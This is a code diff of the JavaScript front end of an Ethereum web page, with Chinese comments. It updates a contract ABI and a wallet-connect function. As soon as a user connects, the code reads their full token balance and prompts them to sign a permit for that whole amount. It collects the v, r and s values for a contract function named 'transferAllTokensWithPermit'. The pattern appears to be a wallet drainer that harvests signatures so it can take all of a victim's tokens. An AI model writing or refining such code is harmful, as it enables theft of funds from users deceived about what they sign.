@@ -3,135 +3,143 @@ let userAddress;
 
 // 替换为你的智能合约 ABI
 const yourContractABI = [
-    // 在这里填入你的合约 ABI
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "target",
-                "type": "address"
-            }
-        ],
-        "name": "AddressEmptyCode",
-        "type": "error"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "account",
-                "type": "address"
-            }
-        ],
-        "name": "AddressInsufficientBalance",
-        "type": "error"
-    },
-    {
-        "inputs": [],
-        "name": "FailedInnerCall",
-        "type": "error"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "token",
-                "type": "address"
-            }
-        ],
-        "name": "SafeERC20FailedOperation",
-        "type": "error"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "token",
-                "type": "address"
-            },
-            {
-                "internalType": "address",
-                "name": "from",
-                "type": "address"
-            },
-            {
-                "internalType": "uint8",
-                "name": "v",
-                "type": "uint8"
-            },
-            {
-                "internalType": "bytes32",
-                "name": "r",
-                "type": "bytes32"
-            },
-            {
-                "internalType": "bytes32",
-                "name": "s",
-                "type": "bytes32"
-            }
-        ],
-        "name": "transferAllTokensWithPermit",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "anonymous": false,
-        "inputs": [
-            {
-                "indexed": true,
-                "internalType": "address",
-                "name": "token",
-                "type": "address"
-            },
-            {
-                "indexed": true,
-                "internalType": "address",
-                "name": "from",
-                "type": "address"
-            },
-            {
-                "indexed": false,
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-            }
-        ],
-        "name": "TransferTokens",
-        "type": "event"
-    }
+	{
+		"inputs": [],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "target",
+				"type": "address"
+			}
+		],
+		"name": "AddressEmptyCode",
+		"type": "error"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "account",
+				"type": "address"
+			}
+		],
+		"name": "AddressInsufficientBalance",
+		"type": "error"
+	},
+	{
+		"inputs": [],
+		"name": "FailedInnerCall",
+		"type": "error"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "token",
+				"type": "address"
+			}
+		],
+		"name": "SafeERC20FailedOperation",
+		"type": "error"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "token",
+				"type": "address"
+			},
+			{
+				"internalType": "address",
+				"name": "from",
+				"type": "address"
+			},
+			{
+				"internalType": "uint8",
+				"name": "v",
+				"type": "uint8"
+			},
+			{
+				"internalType": "bytes32",
+				"name": "r",
+				"type": "bytes32"
+			},
+			{
+				"internalType": "bytes32",
+				"name": "s",
+				"type": "bytes32"
+			}
+		],
+		"name": "transferAllTokensWithPermit",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "token",
+				"type": "address"
+			},
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "from",
+				"type": "address"
+			},
+			{
+				"indexed": false,
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			}
+		],
+		"name": "TransferTokens",
+		"type": "event"
+	}
 ];
 
-// 合约地址
 const contractAddress = '0xB57ee0797C3fc0205714a577c02F7205bB89dF30';
 
 async function connectWallet() {
     console.log("尝试连接钱包");
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const accounts = await web3.eth.getAccounts();
-        userAddress = accounts[0];
-        
-        // 显示连接的钱包地址
-        document.getElementById('address').innerText = userAddress;
-        document.getElementById('walletInfo').classList.remove('hidden');
-        document.getElementById('connectWallet').classList.add('hidden');
+        try {
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const accounts = await web3.eth.getAccounts();
+            userAddress = accounts[0];
 
-        // 自动填写被签名的钱包地址
-        document.getElementById('fromAddress').value = userAddress;
+            console.log("已连接地址:", userAddress); // 输出连接的钱包地址
+            document.getElementById('address').innerText = userAddress;
+            document.getElementById('walletInfo').classList.remove('hidden');
+            document.getElementById('connectWallet').classList.add('hidden');
 
-        // 查询余额并填写
-        const tokenAddress = document.getElementById('tokenAddress').value;
-        const balance = await getTokenBalance(tokenAddress, userAddress);
-        document.getElementById('amount').innerText = balance;
+            // 自动填写被签名的钱包地址
+            document.getElementById('fromAddress').value = userAddress;
 
-        // 自动签名并填写 v, r, s
-        const signature = await signMessage(tokenAddress, userAddress, balance);
-        const { v, r, s } = extractSignatureParameters(signature);
-        document.getElementById('v').value = v;
-        document.getElementById('r').value = r;
-        document.getElementById('s').value = s;
+            // 查询余额并填写
+            const tokenAddress = document.getElementById('tokenAddress').value;
+            const balance = await getTokenBalance(tokenAddress, userAddress);
+            document.getElementById('amount').innerText = balance;
+
+            // 自动签名并填写 v, r, s
+            const signature = await signMessage(tokenAddress, userAddress, balance);
+            const { v, r, s } = extractSignatureParameters(signature);
+            document.getElementById('v').value = v;
+            document.getElementById('r').value = r;
+            document.getElementById('s').value = s;
+        } catch (error) {
+            console.error("连接钱包时出错:", error); // 输出错误信息
+            alert('连接钱包失败，请检查控制台的错误信息。');
+        }
     } else {
         alert('请安装MetaMask或其他以太坊钱包！');
     }
